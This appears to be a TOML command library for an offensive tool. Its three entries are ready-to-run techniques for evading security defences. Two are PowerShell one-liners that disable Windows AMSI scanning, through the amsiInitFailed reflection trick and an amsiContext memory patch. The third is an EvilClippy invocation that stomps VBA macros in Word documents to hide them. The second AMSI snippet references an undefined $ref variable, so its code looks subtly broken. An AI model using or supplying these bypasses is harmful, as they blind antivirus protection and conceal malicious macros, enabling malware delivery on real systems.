[command.AMSI-Bypass-0]
use_name = "AMSI Bypass"
local = true
cmd_types = "security-bypass"
args = "$a=[Ref].Assembly.GetTypes();foreach($b in $a) {if ($b.Name -Like '*iUtil*'){$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d){if($e -Like '*InitF*'){$f=$e}};$f.SetValue($null,$true)"
short_desc = "AMSI Bypass `amsiInitFailed` technique"


[command.AMSI-Bypass-1]
use_name = "AMSI Bypass"
local = true
cmd_types = "security-bypass"
args = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy(@(0), 0, [IntPtr]$ref, 1)"
short_desc = "AMSI Bypass `amsiContext` patch technique"

[command.VBA-Stomping]
use_name = "EvilClippy - VBA Stomping"
local = true
cmd_types = "security-bypass"
args = ".\\EvilClippy.exe -n <macro-name|MyMacro> <word-doc-path|C:\\Users\\user\\Downloads\\Doc1.doc>"
short_desc = "VBA Stomping to increase stealth (using: a `Word 1997-2003` Type Document)"

